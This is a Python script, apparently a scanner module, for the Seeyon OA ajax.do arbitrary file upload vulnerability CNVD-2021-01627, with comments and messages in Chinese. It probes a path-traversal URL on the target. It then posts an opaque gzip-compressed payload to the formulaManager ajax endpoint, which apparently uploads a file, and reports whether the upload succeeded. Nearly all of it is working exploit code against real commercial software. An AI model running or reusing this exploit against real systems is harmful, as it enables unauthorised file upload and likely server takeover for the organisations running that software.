#!/usr/bin/env python
# coding=utf-8
#致远OAajax.do任意文件上传CNVD-2021-01627
import requests, threading, base64
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        headers = {
            'Connection': 'close',
            'close': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'managerMethod': 'validate',
            'arguments': '%1F%C2%8B%08%00%00%00%00%00%00%0BmQ%C3%81N%C3%830%0C%C3%BD%C2%95%C2%A8%C2%97%C2%A4b%C2%A4%1AB%08Q%C3%B5%C2%B0%C2%89%C3%81%0D%21u%C2%83%C3%83%C3%84%214.%C3%8B%C3%94%26Q%C2%92%C2%B2%C2%8Ej%C3%BFN%C3%92%16uB%3B%C3%99%7Ey%7E%C3%8F%C2%8E%C2%B7%1D.%C2%95%C2%A9%C2%9B%C2%8A%C2%AD%C2%8F%1A%C3%B0%03%C2%9A%C3%8F%C3%90%1F%C3%B2%C3%82%C3%AA%C2%80%60%07%C3%96%C3%A1%09%5E%C2%B5%C3%9A%C2%80%C2%B5B%C3%89%C3%B0%C2%98%3B%23%C3%A4%17%C3%92%C3%8C%C3%ADP%C2%86%22J%C2%93%03%7C2%C2%ADmb%01%C2%8EJ%26Q%C2%8A%C3%B6%C3%AC%C2%9BQ%C2%A1%C3%A8%C2%AB%C2%A7%C2%BAw%23%1C%18%C2%A4%C2%A7%C3%BC%C3%867J8%5C%C2%A2%C2%91%C2%A0%7B%15%C3%A5%C2%BD%C3%94Fs%C3%A6%60N%C3%B7V%C2%B7Q%C2%9C%C2%A2%C3%91%C3%9A%C3%AE%C2%A0%C2%AA%C2%827%7F%7E%C3%BB%C3%A1%C2%8B%2C%C3%B3%C2%8E%C2%B6%C2%91%C2%B4%16%C2%B6%C2%A0%C3%8BE%C2%BE%C2%BA%C2%BB%7D%C2%84Bqo%C3%8A%C3%878%C3%B8%5D%26%C2%91Iy%C2%A0%C2%8F%C3%85%C3%903%14d%14%C2%A2C%5C6e%C3%A9%1B%C3%BBA%C3%A2Y%C2%B4Y%3F%5D%C3%9F%C2%87%01%C3%8Fw%C2%A4%7DQIr.%C3%BA%C2%9FST%C3%8A%C2%82%1F%C3%A0%C2%94%C2%86%3F%C3%B7%09%C2%87%12Y%C3%87%C2%9C%28P%C3%9B%C2%B6%24%C3%AE%C3%B0%C3%89%1F%C3%82%1F%C2%A3%0B%C3%91%C2%99%06%C3%B0%C3%87%2Fj%C2%BEa%C3%B3%C3%83%01%00%00'
        }
        if url[-1] == '/':#因为如果有两个/就会报错
            urls = url+'seeyon/thirdpartyController.do.css/..;/ajax.do'
        else:
            urls = url + '/seeyon/thirdpartyController.do.css/..;/ajax.do'
        response = requests.get(url=urls, verify=False, timeout=20)
        bm = response.encoding  # 获取网页编码
        response.encoding = str(bm)  # 设置网页编码
        if 'java.lang.NullPointerException:null' in response.text:
            print(colored('[+]致远OAajax.do任意文件上传CNVD-2021-01627漏洞页面存在，有可能存在漏洞，请手动检测', 'red'))
            results = f'{url}-->致远OAajax.do任意文件上传CNVD-2021-01627漏洞页面存在，有可能存在漏洞，请手动检测--'
            try:
                response = requests.post(url=url+'seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip', verify=False, timeout=20, headers=headers, data=data)
                bm = response.encoding  # 获取网页编码
                response.encoding = str(bm)  # 设置网页编码
                if '"message":null' in response.text and '"details":null' in response.text:
                    print(colored('[+]存在致远OAajax.do任意文件上传CNVD-2021-01627', 'red'))
                    results += f'{url}-->存在致远OAajax.do任意文件上传CNVD-2021-01627'
                elif '{"message":"被迫下线，原因：与服务器失去连接","code":"-1","details":null}' in response.text:
                    print('[-]不存在致远OAajax.do任意文件上传CNVD-2021-01627，文件上传失败')
            except Exception as e:
                print('[-]不存在致远OAajax.do任意文件上传CNVD-2021-01627，文件上传失败')
        else:
            print('[-]不存在致远OAajax.do任意文件上传CNVD-2021-01627')
    except:
        print('[-]不存在致远OAajax.do任意文件上传CNVD-2021-01627')


def zhiyuanOAuploadOAajax(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
